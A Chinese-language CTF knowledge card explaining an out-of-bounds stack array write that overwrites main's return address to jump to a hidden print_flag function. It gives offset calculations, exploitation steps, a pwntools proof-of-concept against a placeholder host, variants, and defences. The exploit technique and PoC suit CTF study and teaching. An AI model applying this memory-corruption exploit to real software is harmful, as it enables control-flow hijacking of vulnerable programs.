---
id: ctf-pwn-int-array-oob-index-ret-overwrite
title: 栈上 int 数组下标未校验：越界写覆盖返回地址跳转隐藏 print_flag
type: scenario
domain: ctf
path: ctf/pwn
technique: int-array-oob-index-ret-overwrite
aliases:
- 数组下标越界写
- int arr[idx] 任意写
- 覆盖返回地址 print_flag
- No PIE ret 覆盖
tags:
- pwn
- stack
- oob-write
- ret2win
- no-pie
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:29:54+08:00'
  notes: 已对照原文核对：arr 基址 rbp-0x30、返回地址 rbp+0x8、偏移 0x38=56/4=14、arr[14]/arr[15] 改返回地址高低 32 位、print_flag=0x4011c9、No PIE、times=2 两次写入均一致。未验证点：无二进制附件，PoC 未本机复跑；原文无版本信息；frontmatter 无 sources/source_url。
---

## 一句话结论

程序用 `scanf("%d", &idx); scanf("%d", &arr[idx]);` 写栈上 `int arr[10]` 却没有检查 `idx` 上界时，可以用越界下标把 `main` 的返回地址低/高 4 字节改成隐藏 `print_flag` 函数地址；No PIE 下地址固定，改两次即可 `ret2win`。

## 原理

- 栈帧布局：`arr` 基址在 `rbp-0x30`，返回地址在 `rbp+0x8`，偏移 `0x38 = 56` 字节；`int` 每元素 4 字节，故 `arr[14]` 覆盖返回地址低 4 字节，`arr[15]` 覆盖高 4 字节。
- 程序只校验 `idx` 的循环次数，不校验下标范围，`arr[idx]` 实际是 `*(arr + idx*4)`，可写到栈上任意位置。
- 若二进制 No PIE，`print_flag` 地址固定（如 `0x4011c9`），直接把返回地址改成该地址；`main` 执行 `leave; ret` 时跳转。
- 为什么可行：C 数组不做边界检查；`scanf("%d")` 允许任意整数下标；返回地址在数组之后固定偏移，且没有 canary/ASLR 阻挡（或 canary 未被触发）。
- 若开启 PIE/Canary/Full RELRO，需要先泄露地址/绕过 canary，或改用其他原语；本卡针对最基础的 No PIE 场景。

## 触发条件

- 栈上定长数组 + 用户可控下标写入，缺少上界检查。
- 返回地址相对数组基址偏移固定且可计算（反汇编 `lea`/`rbp` 偏移）。
- 二进制 No PIE（或已泄露代码基址），存在可用的 `print_flag`/`win` 函数。
- 没有 canary，或写入不触发 canary 校验（覆盖返回地址本身会触发，但程序可能无 canary）。

## 利用步骤

1. 反汇编 `main`，确定 `arr` 基址、`idx`/`times` 变量位置、返回地址偏移；计算 `(rbp+8 - arr_base)/4`。
2. 确认 `print_flag` 地址（`objdump -d`/`nm`/反汇编），确认 No PIE。
3. 计算高低 32 位：`low = addr & 0xffffffff`、`high = addr >> 32`。
4. 运行程序，输入修改次数 2；先写 `idx=14, value=low`，再写 `idx=15, value=high`。
5. `main` 返回时跳转到 `print_flag`，读取 flag。
6. 若程序在写入后还有其他逻辑/校验，确保在 `ret` 前不覆盖关键变量；必要时调整下标/写入顺序。

## PoC

```python
from pwn import *

context.arch = "amd64"
io = remote("target", 19026)
PRINT_FLAG = 0x4011c9

io.sendlineafter(b"How many times you want to change the array\n", b"2")
for idx, val in [(14, PRINT_FLAG & 0xffffffff), (15, (PRINT_FLAG >> 32) & 0xffffffff)]:
    io.sendlineafter(b"Index: \n", str(idx).encode())
    io.sendlineafter(b"Value: \n", str(val).encode())
io.interactive()
```

说明：PoC 为原文 exp 的结构化复现，未在本机执行；原文 `arr[14]`/`arr[15]` 覆盖返回地址后跳转 `0x4011c9` 拿到 flag。

## 变体与关联

- 变体（下标缩放）：`idx*4`、`idx*8`、有符号/无符号转换可能产生不同偏移；先按反汇编确认元素大小与基址。
- 变体（目标）：覆盖返回地址、保存的 `rbp`、函数指针、GOT（Partial RELRO）、全局变量；No PIE 下可直接写绝对地址。
- 变体（保护）：PIE 需泄露代码基址；Canary 需先泄露/绕过；Full RELRO 阻止 GOT 覆盖，可改返回地址/栈上函数指针。
- 关联：[[binary-pwn-stack-tlv-length-low-byte-check-memcpy-overflow]]（栈溢出覆盖返回地址）；[[binary-pwn-stack-sparse-word-write-struct-field-rewrite-ret2libc]]（稀疏写栈）；[[binary-pwn-heap-strcmp-bytewise-libc-pointer-leak]]（逐字节泄露）。
- 边界：数组不在栈上、下标被掩码/范围检查、返回地址偏移随编译器变化、或存在 canary/PIE 时，需重新计算或换原语。

## 检测与防御

- 检测：源码/反汇编中出现 `arr[idx]` 且 `idx` 来自用户输入、无 `if (idx < N)`；二进制无 canary/PIE；程序接受任意大整数下标。
- 防御：对下标做严格范围检查（`0 <= idx < N`），使用 `size_t` 并检查上界；编译开启 `-fstack-protector-strong`、PIE、Full RELRO。
- 加固：用安全容器/`std::array::at`/边界检查库；对输入解析做类型与范围校验；启用 ASAN 进行测试。
